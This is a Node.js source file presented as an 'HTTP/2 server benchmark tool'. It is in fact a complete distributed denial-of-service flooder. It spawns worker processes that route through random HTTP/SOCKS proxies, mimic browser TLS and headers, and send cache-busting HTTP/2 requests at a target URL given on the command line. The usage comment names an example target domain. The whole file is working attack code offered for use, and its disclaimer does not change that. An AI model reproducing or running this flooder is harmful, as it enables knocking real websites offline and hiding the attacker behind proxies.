/*
- HTTP/2 server benchmark tool.
- DISCLAMER: DO NOT USE FOR ILLEGAL PURPOSES.
*/
// node index https://doffybee.com/ 120 64 1 proxies.txt http/socks4/socks5
const errorHandler = (error) => {
  // console.log(error);
  return error;
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const crypto = require("crypto");
const fs = require("fs");
const net = require("net");
const tls = require("tls");
const http2 = require("./http2");
const cluster = require("cluster");

const readLines = (path) => fs.readFileSync(path).toString().split(/\r?\n/);
const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
const randList = (list) => list[Math.floor(Math.random() * list.length)];
const target = new URL(process.argv[2]);
const duration = +process.argv[3] * 1000;
const rates = +process.argv[4];
const threads = +process.argv[5];
const proxies = readLines(process.argv[6] || "proxies.txt");
const protocol = process.argv[7] || "http";
target.path = target.pathname + target.search;

class Tunnel {
  HTTP(options) {
    const buffer = Buffer.from(
      "CONNECT " +
        options.address +
        " HTTP/1.1\r\nHost: " +
        options.address +
        "\r\nConnection: Keep-Alive\r\n\r\n",
      "ascii",
    );
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once("connect", function () {
      clearTimeout(timeout);
      socket.write(buffer);
    });
    socket.once("data", (data) => {
      data.toString().indexOf("HTTP/1.1 200") === -1
        ? socket.destroy()
        : options.handler(socket);
    });
  }
  SOCKS4(options) {
    const address = options.address.split(":");
    const addrHost = address[0];
    const addrPort = +address[1];
    const requestBuffer = Buffer.alloc(10 + addrHost.length);
    requestBuffer[0] = 0x04;
    requestBuffer[1] = 0x01;
    requestBuffer[2] = addrPort >> 8;
    requestBuffer[3] = addrPort & 0xff;
    requestBuffer[4] = 0x00;
    requestBuffer[5] = 0x00;
    requestBuffer[6] = 0x00;
    requestBuffer[7] = 0x01;
    requestBuffer[8] = 0x00;
    Buffer.from(addrHost, "ascii").copy(requestBuffer, 9, 0, addrHost.length);
    requestBuffer[requestBuffer.length - 1] = 0x00;
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once("connect", function () {
      clearTimeout(timeout);
      socket.write(requestBuffer);
    });
    socket.once("data", (data) => {
      data.length !== 8 || data[1] !== 0x5a
        ? socket.destroy()
        : options.handler(socket);
    });
  }
  SOCKS5(options) {
    const address = options.address.split(":");
    const addrHost = address[0];
    const addrPort = +address[1];
    const greeting = Buffer.from([0x05, 0x01, 0x00]);
    const buffer = Buffer.alloc(addrHost.length + 7);
    buffer[0] = 0x05;
    buffer[1] = 0x01;
    buffer[2] = 0x00;
    buffer[3] = 0x03;
    buffer[4] = addrHost.length;
    Buffer.from(addrHost, "ascii").copy(buffer, 5, 0, addrHost.length);
    buffer[buffer.length - 2] = addrPort >> 8;
    buffer[buffer.length - 1] = addrPort & 0xff;
    const socket = createSocket();
    socket.connect(options.port, options.host);
    const timeout = setTimeout(function () {
      socket.destroy();
    }, options.timeout);
    socket.once("connect", function () {
      clearTimeout(timeout);
      socket.write(greeting);
    });
    socket.once("data", (data) => {
      if (data.length !== 2 || data[0] !== 0x05 || data[1] !== 0x00) {
        socket.destroy();
        return;
      }
      socket.write(buffer);
      socket.once("data", (data) => {
        data[0] !== 0x05 || data[1] !== 0x00
          ? socket.destroy()
          : options.handler(socket);
      });
    });
  }
}

const tunnel = new Tunnel();
const protocols = {
  http: tunnel.HTTP,
  socks4: tunnel.SOCKS4,
  socks5: tunnel.SOCKS5,
};

function createSocket() {
  const socket = new net.Socket();
  socket.allowHalfOpen = true;
  socket.writable = true;
  socket.readable = true;
  socket.setNoDelay(true);
  socket.setKeepAlive(true, 60 * 1000);
  return socket;
}

const headers = {
  ":method": "GET",
  ":authority": target.host,
  ":scheme": "https",
  ":path": "",
  "user-agent":
    "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
  accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "accept-language": "en-US,en;q=0.9",
  "upgrade-insecure-requests": "1",
  "sec-fetch-dest": "document",
  "sec-fetch-mode": "navigate",
  "sec-fetch-site": "none",
  "sec-fetch-user": "?1",
  priority: "u=0, i",
  pragma: "no-cache",
  "cache-control": "no-cache",
};

async function handler(socket) {
  const secureSocket = tls.connect(443, target.host, {
    socket,
    servername: target.host,
    ALPNProtocols: ["h2"],
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3",
    rejectUnauthorized: false,
    ciphers: [
      "TLS_AES_128_GCM_SHA256",
      "TLS_CHACHA20_POLY1305_SHA256",
      "TLS_AES_256_GCM_SHA384",
      "ECDHE-ECDSA-AES128-GCM-SHA256",
      "ECDHE-RSA-AES128-GCM-SHA256",
      "ECDHE-ECDSA-CHACHA20-POLY1305",
      "ECDHE-RSA-CHACHA20-POLY1305",
      "ECDHE-ECDSA-AES256-GCM-SHA384",
      "ECDHE-RSA-AES256-GCM-SHA384",
      "ECDHE-ECDSA-AES256-SHA",
      "ECDHE-RSA-AES128-SHA",
      "ECDHE-RSA-AES256-SHA",
      "AES128-GCM-SHA256",
      "AES256-GCM-SHA384",
      "AES128-SHA",
      "AES256-SHA",
    ].join(":"),
    sigalgs: [
      "ecdsa_secp256r1_sha256",
      "ecdsa_secp384r1_sha384",
      "ecdsa_secp521r1_sha512",
      "rsa_pss_rsae_sha256",
      "rsa_pss_rsae_sha384",
      "rsa_pss_rsae_sha512",
      "rsa_pkcs1_sha256",
      "rsa_pkcs1_sha384",
      "rsa_pkcs1_sha512",
      "ecdsa_sha1",
      "rsa_pkcs1_sha1",
    ].join(":"),
    ecdhCurve: "X25519:P-256:P-384:P-521:ffdhe2048:ffdhe3072",
    secureOptions:
      crypto.constants.SSL_OP_ALL |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_TLSv1 |
      crypto.constants.SSL_OP_NO_TLSv1_1 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
      crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
  });

  secureSocket.on("secureConnect", function () {
    const client = http2.connect(target.origin, {
      initialStreamId: 1,
      createConnection: () => secureSocket,
    });

    client.settings({
      [http2.settings.HEADER_TABLE_SIZE]: 65536,
      [http2.settings.ENABLE_PUSH]: 0,
      [http2.settings.INITIAL_WINDOW_SIZE]: 6291456,
      [http2.settings.MAX_HEADER_LIST_SIZE]: 262144,
    });

    client.windowUpdate(15663105);

    const requests = new Set();

    let remoteMaxConcurrentStreams = 100;

    // Cập nhật giới hạn do server công bố.
    client.on("remoteSettings", (settings) => {
      const serverLimit = settings[http2.settings.MAX_CONCURRENT_STREAMS];

      if (Number.isInteger(serverLimit)) {
        remoteMaxConcurrentStreams = serverLimit;
      }
    });

    const clearRequests = () => {
      for (const request of requests) {
        if (!request.destroyed) {
          request.close(http2.constants.NGHTTP2_CANCEL);
        }
      }

      requests.clear();
    };
    const loop = setInterval(() => {
      const availableSlots = remoteMaxConcurrentStreams - requests.size;
      if (availableSlots <= 0) {
        return;
      }
      const amount = Math.min(rates, availableSlots);
      for (let counter = 0; counter < amount; counter++) {
        let request;
        try {
          const randStr = Math.random().toString(36).substring(2, 12);
          request = client.request(
            {
              ...headers,
              ":path": `${target.path}?${randStr}`,
            },
            {
              priority: {
                weight: 256,
                stream_dependency: 0,
                exclusive: true,
              },
            },
          );
        } catch (error) {
          if (error.message.includes("concurrent streams")) {
            // Có thể settings vừa thay đổi hoặc một stream chưa cleanup.
            // Dừng vòng hiện tại, không hủy toàn bộ stream.
            break;
          }
          continue;
        }
        requests.add(request);
        request.once("close", () => {
          requests.delete(request);
        });

        request.once("error", () => {
          requests.delete(request);
        });
        request.on("data", (chunk) => {
          console.log(chunk.toString());
        });
        request.end();
      }
    }, 500);
    const stop = () => {
      clearInterval(loop);
      clearRequests();
    };
    socket.once("error", stop);
    socket.once("close", stop);
  });
}
function prepareAttack() {
  const proxy = randList(proxies).split(":");
  const options = {
    host: proxy[0],
    port: +proxy[1],
    address: target.host + ":443",
    timeout: 5000,
    handler,
  };
  protocols[protocol](options);
}

if (cluster.isPrimary) {
  setTimeout(function () {
    process.exit(0);
  }, duration);
  for (let counter = 0; counter < threads; counter++) {
    cluster.fork();
    console.log("[*] Thread", counter, "started!");
  }
} else {
  setInterval(prepareAttack);
}
